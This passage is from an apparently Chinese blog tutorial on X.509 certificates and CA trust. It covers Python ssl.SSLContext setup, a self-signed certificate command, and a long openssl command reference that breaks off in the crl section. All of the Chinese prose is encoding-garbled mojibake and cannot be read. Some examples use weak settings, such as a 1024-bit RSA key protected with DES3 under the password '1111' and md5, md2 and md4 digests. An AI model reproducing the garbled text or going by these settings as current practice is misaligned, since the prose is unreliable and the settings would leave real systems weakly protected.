è¯ä¹¦</h3><p>æ€»çš„æ¥è¯´ï¼Œè¯ä¹¦æ˜¯å…¬é’¥/ç§é’¥ç³»ç»Ÿçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚</p><p>åœ¨ä¸€ä¸ªè¯ä¹¦ä¸­åŒ…å«æœ‰ä¸¤ä¸ªä¸»ä½“çš„ç›¸å…³ä¿¡æ¯ã€‚</p><ul><li><p>å…¶åŒ…å«ç›®æ ‡æ–¹çš„åç§°å’Œç›®æ ‡æ–¹çš„å…¬é’¥ã€‚</p></li><li><p>è¿˜åŒ…å«ç”±ç¬¬äºŒä¸ªä¸»ä½“é¢å‘æ–¹æ‰€å‘å¸ƒçš„å£°æ˜ï¼šç›®æ ‡æ–¹çš„èº«ä»½ä¸ä»–ä»¬æ‰€å®£ç§°çš„ä¸€è‡´ï¼ŒåŒ…å«çš„å…¬é’¥ä¹Ÿç¡®å®æ˜¯ç›®æ ‡æ–¹çš„å…¬é’¥ã€‚ é¢å‘æ–¹çš„å£°æ˜ä½¿ç”¨é¢å‘æ–¹çš„ç§é’¥è¿›è¡Œç­¾åï¼Œè¯¥ç§é’¥çš„å†…å®¹åªæœ‰é¢å‘æ–¹è‡ªå·±æ‰çŸ¥é“ã€‚ ä½†æ˜¯ï¼Œä»»ä½•äººéƒ½å¯ä»¥æ‰¾åˆ°é¢å‘æ–¹çš„å…¬é’¥ï¼Œç”¨å®ƒæ¥è§£å¯†è¿™ä¸ªå£°æ˜ï¼Œå¹¶å°†å…¶ä¸è¯ä¹¦ä¸­çš„å…¶ä»–ä¿¡æ¯è¿›è¡Œæ¯”è¾ƒæ¥éªŒè¯é¢å‘æ–¹å£°æ˜çš„çœŸå®æ€§ã€‚ è¯ä¹¦è¿˜åŒ…å«æœ‰å…³å…¶æœ‰æ•ˆæœŸé™çš„ä¿¡æ¯ã€‚ è¿™è¢«è¡¨ç¤ºä¸ºä¸¤ä¸ªå­—æ®µï¼Œå³ â€œnotBeforeâ€ å’Œ â€œnotAfterâ€ã€‚</p><p><img src="/posts/cf547d62/image-20211230101906909.png" alt="image-20211230101906909"></p></li></ul><p>åœ¨ Python ä¸­åº”ç”¨è¯ä¹¦æ—¶ï¼Œå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å¯ä»¥ç”¨è¯ä¹¦æ¥è¯æ˜è‡ªå·±çš„èº«ä»½ã€‚ è¿˜å¯ä»¥è¦æ±‚ç½‘ç»œè¿æ¥çš„å¦ä¸€æ–¹æä¾›è¯ä¹¦ï¼Œæä¾›çš„è¯ä¹¦å¯ä»¥ç”¨äºéªŒè¯ä»¥æ»¡è¶³å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨çš„éªŒè¯è¦æ±‚ã€‚ å¦‚æœéªŒè¯å¤±è´¥ï¼Œè¿æ¥å°è¯•å¯è¢«è®¾ç½®ä¸ºå¼•å‘ä¸€ä¸ªå¼‚å¸¸ã€‚ éªŒè¯æ˜¯ç”±ä¸‹å±‚çš„ OpenSSL æ¡†æ¶æ¥è‡ªåŠ¨æ‰§è¡Œçš„ï¼›åº”ç”¨ç¨‹åºæœ¬èº«ä¸å¿…å…³æ³¨å…¶å†…éƒ¨çš„æœºåˆ¶ã€‚ ä½†æ˜¯åº”ç”¨ç¨‹åºé€šå¸¸éœ€è¦æä¾›ä¸€ç»„è¯ä¹¦ä»¥å…è®¸æ­¤è¿‡ç¨‹çš„å‘ç”Ÿã€‚</p><h3 id="ca-è¯ä¹¦"><a class="markdownIt-Anchor" href="#ca-è¯ä¹¦"></a> CA è¯ä¹¦</h3><p>å¦‚æœæƒ³è¦å¯¹è¿æ¥çš„å¦ä¸€æ–¹çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œå®¢æˆ·ç«¯å¿…é¡»æä¾›ä¸€ä¸ª â€œCA è¯ä¹¦â€ æ–‡ä»¶ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªCAæœºæ„çš„å…¬é’¥ï¼Œç”¨è¿™ä¸ªå…¬é’¥å»éªŒè¯è¢«CAæœºæ„çš„é¢å‘çš„ç›®æ ‡ç½‘ç«™çš„è¯ä¹¦ï¼Œè¿™ä¸ªè¯ä¹¦ç›¸å½“äºè¢«CAæœºæ„çš„ç§é’¥ç­¾åè¿‡ã€‚æ‰€ä»¥å¦‚æœé€šè¿‡éªŒè¯ï¼Œåˆ™è¡¨æ˜è¯¥ç½‘ç«™è¢«CAä¿¡ä»»ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å°±å¯ä»¥ç›¸ä¿¡å®ƒã€‚</p><p>éªŒè¯åŸç†å¯ä»¥è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li><p>å®¢æˆ·ç«¯ä¿¡ä»»CA</p></li><li><p>CAä¿¡ä»»ç›®æ ‡ç½‘ç«™</p></li><li><p>å®¢æˆ·ç«¯å¯ä»¥ä¿¡ä»»ç›®æ ‡ç½‘ç«™</p></li></ul><p>éªŒè¯é€»è¾‘å¦‚ä¸‹</p><p><strong>æœåŠ¡ç«¯ç«¯</strong></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># åŠ è½½ä¸€ä¸ªç§é’¥åŠå¯¹åº”çš„è¯ä¹¦</span><br>context.load_cert_chain(<span class="hljs-attribute">certfile</span>=<span class="hljs-string">&quot;server.crt&quot;</span>, <span class="hljs-attribute">keyfile</span>=<span class="hljs-string">&quot;server.key&quot;</span>)<br></code></pre></div></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br><span class="hljs-built_in">context</span> = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># åŠ è½½ä¸€ç»„ç”¨äºéªŒè¯å¯¹æ–¹ç½‘ç«™è¯ä¹¦çš„CAè¯ä¹¦</span><br><span class="hljs-built_in">context</span>.load_verify_locations(<span class="hljs-string">&quot;cert.pem&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="è‡ªç­¾åè¯ä¹¦"><a class="markdownIt-Anchor" href="#è‡ªç­¾åè¯ä¹¦"></a> è‡ªç­¾åè¯ä¹¦</h3><p>ä¸‹é¢çš„å‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ï¼Œå› ä¸ºå®éªŒä¸­ä¸€èˆ¬ä¸ä¼šå»çœŸçš„CAæœºæ„ç»™æœåŠ¡å™¨ç­¾åï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è‡ªç­¾åè¯ä¹¦æ¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªCAè¯ä¹¦</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">openssl req -<span class="hljs-keyword">new</span> -x509 -days <span class="hljs-number">365</span> -nodes -<span class="hljs-keyword">out</span> cert.pem -keyout key.pem -subj <span class="hljs-string">&quot;/C=CN/ST=province/L=city/O=company/OU=/CN=YourWebSiteName&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="python-socketç¼–ç¨‹"><a class="markdownIt-Anchor" href="#python-socketç¼–ç¨‹"></a> python socketç¼–ç¨‹</h2><p>å‚è§åšä¸»ä¹‹å‰å†™è¿‡<a href="https://zino00.github.io/posts/79900945/">socketç¼–ç¨‹</a></p><h2 id="opensslå‘½ä»¤å‚è€ƒ"><a class="markdownIt-Anchor" href="#opensslå‘½ä»¤å‚è€ƒ"></a> opensslå‘½ä»¤å‚è€ƒ</h2><p>è¿™éƒ¨åˆ†å‚è€ƒè‡ª<a href="https://blog.csdn.net/gengxiaoming7/article/details/78505107">opensslè¯¦è§£</a></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">1. openssl list-standard-commands(æ ‡å‡†å‘½ä»¤)<br>    1) asn1parse: asn1parseç”¨äºè§£é‡Šç”¨ANS.1è¯­æ³•ä¹¦å†™çš„è¯­å¥(ASNä¸€èˆ¬ç”¨äºå®šä¹‰è¯­æ³•çš„æ„æˆ) <br>    2) ca: caç”¨äºCAçš„ç®¡ç† <br>    openssl ca [options]:<br>        2.1) -selfsign<br>        ä½¿ç”¨å¯¹è¯ä¹¦è¯·æ±‚è¿›è¡Œç­¾åçš„å¯†é’¥å¯¹æ¥ç­¾å‘è¯ä¹¦ã€‚å³&quot;è‡ªç­¾å&quot;ï¼Œè¿™ç§æƒ…å†µå‘ç”Ÿåœ¨ç”Ÿæˆè¯ä¹¦çš„å®¢æˆ·ç«¯ã€ç­¾å‘è¯ä¹¦çš„CAéƒ½æ˜¯åŒä¸€å°æœºå™¨(ä¹Ÿæ˜¯æˆ‘ä»¬å¤§å¤šæ•°å®éªŒä¸­çš„æƒ…å†µ)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ª<br>å¯†é’¥å¯¹æ¥è¿›è¡Œ&quot;è‡ªç­¾å&quot;<br>        2.2) -in file<br>        éœ€è¦è¿›è¡Œå¤„ç†çš„PEMæ ¼å¼çš„è¯ä¹¦<br>        2.3) -out file<br>        å¤„ç†ç»“æŸåè¾“å‡ºçš„è¯ä¹¦æ–‡ä»¶<br>        2.4) -cert file<br>        ç”¨äºç­¾å‘çš„æ ¹CAè¯ä¹¦<br>        2.5) -days arg <br>        æŒ‡å®šç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´<br>        2.6) -keyfile arg   <br>        CAçš„ç§é’¥è¯ä¹¦æ–‡ä»¶<br>        2.7) -keyform arg<br>        CAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼:<br>            2.7.1) PEM<br>            2.7.2) ENGINE <br>        2.8) -key arg   <br>        CAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶çš„è§£å¯†å¯†ç (å¦‚æœåŠ å¯†äº†çš„è¯)<br>        2.9) -config file    <br>        é…ç½®æ–‡ä»¶<br>    example1: åˆ©ç”¨CAè¯ä¹¦ç­¾ç½²è¯·æ±‚è¯ä¹¦<br>    openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key  <br><br>    3) req: X.509è¯ä¹¦ç­¾å‘è¯·æ±‚(CSR)ç®¡ç†<br>    openssl req [options] &lt;infile &gt;outfile<br>        3.1) -inform arg<br>        è¾“å…¥æ–‡ä»¶æ ¼å¼<br>            3.1.1) DER<br>            3.1.2) PEM<br>        3.2) -outform arg   <br>        è¾“å‡ºæ–‡ä»¶æ ¼å¼<br>            3.2.1) DER<br>            3.2.2) PEM<br>        3.3) -in arg<br>        å¾…å¤„ç†æ–‡ä»¶<br>        3.4) -out arg<br>        å¾…è¾“å‡ºæ–‡ä»¶<br>        3.5) -passin        <br>        ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶çš„è§£å¯†å¯†ç <br>        3.6) -key file<br>        ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶<br>        3.7) -keyform arg  <br>            3.7.1) DER<br>            3.7.2) NET<br>            3.7.3) PEM<br>        3.8) -new<br>        æ–°çš„è¯·æ±‚<br>        3.9) -x509          <br>        è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦ <br>        3.10) -days<br>        X509è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´  <br>        3.11) -newkey rsa:bits <br>        ç”Ÿæˆä¸€ä¸ªbitsé•¿åº¦çš„RSAç§é’¥æ–‡ä»¶ï¼Œç”¨äºç­¾å‘  <br>        3.12) -[digest]<br>        HASHç®—æ³•<br>            3.12.1) md5<br>            3.12.2) sha1<br>            3.12.3) md2<br>            3.12.4) mdc2<br>            3.12.5) md4<br>        3.13) -config file   <br>        æŒ‡å®šopensslé…ç½®æ–‡ä»¶<br>        3.14) -text: textæ˜¾ç¤ºæ ¼å¼<br>    example1: åˆ©ç”¨CAçš„RSAå¯†é’¥åˆ›å»ºä¸€ä¸ªè‡ªç­¾ç½²çš„CAè¯ä¹¦(X.509ç»“æ„) <br>    openssl req -new -x509 -days 3650 -key server.key -out ca.crt <br>    example2: ç”¨server.keyç”Ÿæˆè¯ä¹¦ç­¾ç½²è¯·æ±‚CSR(è¿™ä¸ªCSRç”¨äºä¹‹å¤–å‘é€å¾…CAä¸­å¿ƒç­‰å¾…ç­¾å‘)<br>    openssl req -new -key server.key -out server.csr<br>    example3: æŸ¥çœ‹CSRçš„ç»†èŠ‚<br>    openssl req -noout -text -in server.csr<br><br>    4) genrsa: ç”ŸæˆRSAå‚æ•°<br>    openssl genrsa [args] [numbits]<br>        [args]<br>        4.1) å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†:<br>            4.1.1) -des: CBCæ¨¡å¼çš„DESåŠ å¯†<br>            4.1.2) -des3: CBCæ¨¡å¼çš„DESåŠ å¯†<br>            4.1.3) -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯†<br>            4.1.4) -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯†<br>            4.1.5) -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯†<br>        4.2) -passout arg: argä¸ºå¯¹ç§°åŠ å¯†(desã€desã€aes)çš„å¯†ç (ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚)<br>        4.3) -out file: è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶<br>        [numbits]: å¯†é’¥é•¿åº¦<br>    example: ç”Ÿæˆä¸€ä¸ª1024ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨DESåŠ å¯†(å¯†ç ä¸º1111)ï¼Œä¿å­˜ä¸ºserver.keyæ–‡ä»¶<br>    openssl genrsa -out server.key -passout pass:1111 -des3 1024 <br><br>    5) rsa: RSAæ•°æ®ç®¡ç†<br>    openssl rsa [options] &lt;infile &gt;outfile<br>        5.1) -inform arg<br>        è¾“å…¥å¯†é’¥æ–‡ä»¶æ ¼å¼:<br>            5.1.1) DER(ASN1)<br>            5.1.2) NET<br>            5.1.3) PEM(base64ç¼–ç æ ¼å¼)<br>         5.2) -outform arg<br>         è¾“å‡ºå¯†é’¥æ–‡ä»¶æ ¼å¼<br>            5.2.1) DER<br>            5.2.2) NET<br>            5.2.3) PEM<br>        5.3) -in arg<br>        å¾…å¤„ç†å¯†é’¥æ–‡ä»¶ <br>        5.4) -passin arg<br>        è¾“å…¥è¿™ä¸ªåŠ å¯†å¯†é’¥æ–‡ä»¶çš„è§£å¯†å¯†é’¥(å¦‚æœåœ¨ç”Ÿæˆè¿™ä¸ªå¯†é’¥æ–‡ä»¶çš„æ—¶å€™ï¼Œé€‰æ‹©äº†åŠ å¯†ç®—æ³•äº†çš„è¯)<br>        5.5) -out arg<br>        å¾…è¾“å‡ºå¯†é’¥æ–‡ä»¶<br>        5.6) -passout arg  <br>        å¦‚æœå¸Œæœ›è¾“å‡ºçš„å¯†é’¥æ–‡ä»¶ç»§ç»­ä½¿ç”¨åŠ å¯†ç®—æ³•çš„è¯åˆ™æŒ‡å®šå¯†ç  <br>        5.7) -des: CBCæ¨¡å¼çš„DESåŠ å¯†<br>        5.8) -des3: CBCæ¨¡å¼çš„DESåŠ å¯†<br>        5.9) -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯†<br>        5.10) -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯†<br>        5.11) -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯†<br>        5.12) -text: ä»¥textå½¢å¼æ‰“å°å¯†é’¥keyæ•°æ® <br>        5.13) -noout: ä¸æ‰“å°å¯†é’¥keyæ•°æ® <br>        5.14) -pubin: æ£€æŸ¥å¾…å¤„ç†æ–‡ä»¶æ˜¯å¦ä¸ºå…¬é’¥æ–‡ä»¶<br>        5.15) -pubout: è¾“å‡ºå…¬é’¥æ–‡ä»¶<br>    example1: å¯¹ç§é’¥æ–‡ä»¶è¿›è¡Œè§£å¯†<br>    openssl rsa -in server.key -passin pass:111 -out server_nopass.key<br>    example:2: åˆ©ç”¨ç§é’¥æ–‡ä»¶ç”Ÿæˆå¯¹åº”çš„å…¬é’¥æ–‡ä»¶<br>    openssl rsa -in server.key -passin pass:111 -pubout -out server_public.key<br><br>    6) x509:<br>    æœ¬æŒ‡ä»¤æ˜¯ä¸€ä¸ªåŠŸèƒ½å¾ˆä¸°å¯Œçš„è¯ä¹¦å¤„ç†å·¥å…·ã€‚å¯ä»¥ç”¨æ¥æ˜¾ç¤ºè¯ä¹¦çš„å†…å®¹ï¼Œè½¬æ¢å…¶æ ¼å¼ï¼Œç»™CSRç­¾åç­‰X.509è¯ä¹¦çš„ç®¡ç†å·¥ä½œ<br>    openssl x509 [args]    <br>        6.1) -inform arg<br>        å¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶æ ¼å¼<br>            6.1.1) DER<br>            6.1.2) NET<br>            6.1.3) PEM<br>        6.2) -outform arg   <br>        å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶æ ¼å¼<br>            6.2.1) DER<br>            6.2.2) NET<br>            6.2.3) PEM<br>        6.3) -in arg <br>        å¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶<br>        6.4) -out arg       <br>        å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶<br>        6.5) -req            <br>        è¡¨æ˜è¾“å…¥æ–‡ä»¶æ˜¯ä¸€ä¸ª&quot;è¯·æ±‚ç­¾å‘è¯ä¹¦æ–‡ä»¶(CSR)&quot;ï¼Œç­‰å¾…è¿›è¡Œç­¾å‘ <br>        6.6) -days arg       <br>        è¡¨æ˜å°†è¦ç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ <br>        6.7) -CA arg <br>        æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„æ ¹CAè¯ä¹¦ <br>        6.8) -CAform arg     <br>        æ ¹CAè¯ä¹¦æ ¼å¼(é»˜è®¤æ˜¯PEM) <br>        6.9) -CAkey arg      <br>        æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„CAç§é’¥è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè¿™ä¸ªoptionæ²¡æœ‰å‚æ•°è¾“å…¥ï¼Œé‚£ä¹ˆç¼ºçœè®¤ä¸ºç§æœ‰å¯†é’¥åœ¨CAè¯ä¹¦æ–‡ä»¶é‡Œæœ‰<br>        6.10) -CAkeyform arg  <br>        æŒ‡å®šæ ¹CAç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼(é»˜è®¤ä¸ºPEMæ ¼å¼)<br>        6.11) -CAserial arg   <br>        æŒ‡å®šåºåˆ—å·æ–‡ä»¶(serial number file)<br>        6.12) -CAcreateserial <br>        å¦‚æœåºåˆ—å·æ–‡ä»¶(serial number file)æ²¡æœ‰æŒ‡å®šï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºå®ƒ     <br>    example1: è½¬æ¢DERè¯ä¹¦ä¸ºPEMæ ¼å¼<br>    openssl x509 -in cert.cer -inform DER -outform PEM -out cert.pem<br>    example2: ä½¿ç”¨æ ¹CAè¯ä¹¦å¯¹&quot;è¯·æ±‚ç­¾å‘è¯ä¹¦&quot;è¿›è¡Œç­¾å‘ï¼Œç”Ÿæˆx509æ ¼å¼è¯ä¹¦<br>    openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt<br>    example3: æ‰“å°å‡ºè¯ä¹¦çš„å†…å®¹<br>    openssl x509 -in server.crt -noout -text <br><br>    7) crl: crlæ˜¯ç”¨äºç®¡ç†CRLåˆ—è¡¨ <br>    openssl crl [args]<br>        7.1) -inform arg<br>        è¾“å…¥æ–‡ä»¶çš„æ ¼å¼<br>            7.1.1) DER(DERç¼–ç çš„CRLå¯¹è±¡)<br>            7.1.2) PEM(é»˜è®¤çš„æ ¼å¼)(base64ç¼–ç çš„CRLå¯¹è±¡)<br>        7.2) -outform arg<br>        æŒ‡å®šæ–‡ä»¶çš„è¾“å‡ºæ ¼å¼ <br>            7.2.1) DER(DERç¼–ç çš„CRLå¯¹è±¡)<br>            7.2.2) PEM(é»˜è®¤çš„æ ¼å¼)(base64ç¼–ç çš„CRLå¯¹è±¡)<br>        7.3) -text: <br>        ä»¥æ–‡æœ¬æ ¼å¼æ¥æ‰“å°CRLä¿¡æ¯å€¼ã€‚<br>        7.4) -in filename<br>        æŒ‡å®šçš„è¾“å…¥æ–‡ä»¶åã€‚é»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥ã€‚<br>        7.5) -out filename<br>        æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶åã€‚é»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºã€‚<br>        7.6) -hash<br>        è¾“å‡ºé¢å‘è€…ä¿¡æ¯å€¼çš„å“ˆå¸Œå€¼ã€‚è¿™ä¸€é¡¹å¯ç”¨äºåœ¨æ–‡ä»¶ä¸­æ ¹æ®é¢å‘è€…ä¿¡æ¯å€¼çš„å“ˆå¸Œå€¼æ¥æŸ¥è¯¢CRLå¯¹è±¡ã€‚<br>        7.7) -fingerprint<br>        æ‰“å°CRLå¯¹è±¡çš„æ ‡è¯†ã€‚<br>        7.8) -issuer<br>        è¾“å‡ºé¢å‘è€…çš„ä¿¡æ¯å€¼ã€‚<br>        7.9) -lastupdate<br>        è¾“å‡ºä¸Šä¸€æ¬¡æ›´æ–°çš„æ—¶é—´ã€‚<br>        7.10) -nextupdate<br>        